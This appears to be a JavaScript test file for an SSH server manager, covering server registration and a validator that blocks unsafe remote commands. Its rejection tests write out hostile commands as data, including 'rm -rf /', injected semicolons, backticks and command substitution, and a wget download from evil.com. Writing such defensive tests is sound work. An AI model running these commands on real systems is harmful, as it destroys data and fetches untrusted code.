import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { SSHManager } from '../src/remote/ssh.js';

describe('SSHManager', () => {
  it('lists servers (starts empty or with loaded config)', () => {
    const servers = SSHManager.listServers();
    assert.ok(Array.isArray(servers));
  });

  it('adds and retrieves a server', () => {
    SSHManager.addServer('test-srv', '192.168.1.1', 'admin', 22, '');
    const server = SSHManager.getServer('test-srv');
    assert.ok(server);
    assert.equal(server.host, '192.168.1.1');
    assert.equal(server.user, 'admin');
    assert.equal(server.port, 22);
  });

  it('lists added server', () => {
    const servers = SSHManager.listServers();
    const found = servers.find(s => s.name === 'test-srv');
    assert.ok(found);
    assert.equal(found.host, '192.168.1.1');
  });

  it('removes a server', () => {
    const result = SSHManager.removeServer('test-srv');
    assert.equal(result, true);
    assert.equal(SSHManager.getServer('test-srv'), undefined);
  });

  it('returns false when removing non-existent server', () => {
    const result = SSHManager.removeServer('non-existent');
    assert.equal(result, false);
  });

  it('rejects blocked commands (rm)', async () => {
    SSHManager.addServer('safety-test', 'localhost', 'test', 22, '');
    try {
      await SSHManager.execute('safety-test', 'rm -rf /');
      assert.fail('Should have thrown');
    } catch (err) {
      assert.ok(err.message.includes('bloqueado'));
    }
    SSHManager.removeServer('safety-test');
  });

  it('rejects shell metacharacters (pipe)', () => {
    const err = SSHManager.validateCommand('ls | grep foo');
    assert.ok(err);
    assert.ok(err.includes('caracteres de shell'));
  });

  it('rejects shell metacharacters (semicolon)', () => {
    const err = SSHManager.validateCommand('ls; rm -rf /');
    assert.ok(err);
  });

  it('rejects shell metacharacters (command substitution)', () => {
    const err = SSHManager.validateCommand('echo $(whoami)');
    assert.ok(err);
  });

  it('rejects shell metacharacters (backticks)', () => {
    const err = SSHManager.validateCommand('echo `reboot`');
    assert.ok(err);
  });

  it('rejects wget with -o flag', () => {
    const err = SSHManager.validateCommand('wget -O malware.sh https://evil.com/script');
    assert.ok(err);
    assert.ok(err.includes('descarga'));
  });

  it('allows safe commands', () => {
    assert.equal(SSHManager.validateCommand('ls -la'), null);
    assert.equal(SSHManager.validateCommand('df -h'), null);
    assert.equal(SSHManager.validateCommand('docker ps'), null);
    assert.equal(SSHManager.validateCommand('docker logs llm-remote --tail 20'), null);
    assert.equal(SSHManager.validateCommand('cat /var/log/syslog'), null);
    assert.equal(SSHManager.validateCommand('top -bn1'), null);
    assert.equal(SSHManager.validateCommand('free -m'), null);
  });

  it('rejects command on non-existent server', async () => {
    try {
      await SSHManager.execute('ghost-server', 'ls');
      assert.fail('Should have thrown');
    } catch (err) {
      assert.ok(err.message.includes('no configurado'));
    }
  });
});
